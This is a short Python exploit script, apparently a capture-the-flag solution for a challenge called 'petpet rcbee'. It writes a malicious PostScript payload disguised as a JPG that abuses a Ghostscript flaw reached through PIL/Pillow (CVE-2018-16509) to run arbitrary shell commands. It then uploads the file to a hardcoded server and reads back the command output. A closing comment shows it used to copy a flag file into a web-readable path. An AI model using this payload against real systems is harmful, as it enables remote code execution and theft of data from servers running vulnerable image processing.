#!/usr/bin/env python3

# petpet rcbeee

# Vulnerability:
# 1) It is using a vulnerable Ghostscript (ghostscript-9.23-linux-x86_64.tgz)
# 2) `from PIL import Image` - PIL/Pillow library uses Ghostscript
# 3) Uploading a malicious JPG file, we can obtain RCE

# Reference:
# https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509

from weakref import proxy
import requests
import os
import sys

def createPayload(cmd, filename):
    template = "%!PS-Adobe-3.0 EPSF-3.0\n"
    template+= "%%BoundingBox: -0 -0 100 100\n\n"
    template+= "userdict /setpagedevice undef\n"
    template+= "save\n"
    template+= "legal\n"
    template+= "{ null restore } stopped { pop } if\n"
    template+= "{ legal } stopped { pop } if\n"
    template+= "restore\n"
    template+= "mark /OutputFile (%pipe%{}) currentdevice putdeviceprops".format(cmd)

    f = open(filename, "w")
    f.write(template)
    f.close()

def connect(url, uploads, cmd, filename):
    payload = createPayload(cmd, filename)
    print(payload)

    proxies = {
        'http': 'http://127.0.0.1:8080'
    }

    with open(filename, 'rb') as img:
        name_img= os.path.basename(filename)
        files= {'file': (name_img,img,'multipart/form-data')}
        with requests.Session() as s:
            r = s.post(url+uploads,files=files, proxies=proxies)
            print(r.status_code)
            print(r.text)

def accessFile(url, static):
    r = requests.get(url+static)
    print(r.text)



def main():
    url = "http://104.248.173.13:31796"
    uploads = "/api/upload"
    static = "/static/petpets/got_rce"

    try:
        cmd = sys.argv[1]
        filename = sys.argv[2]
    except IndexError:
        print("[ERROR]")
        sys.exit(1)

    connect(url, uploads, cmd, filename)
    accessFile(url, static)


if __name__ == '__main__':
    main()

# python3 petpet_rcbee.py 'cat flag > /app/application/static/petpets/got_rce' bigb0ss.jpg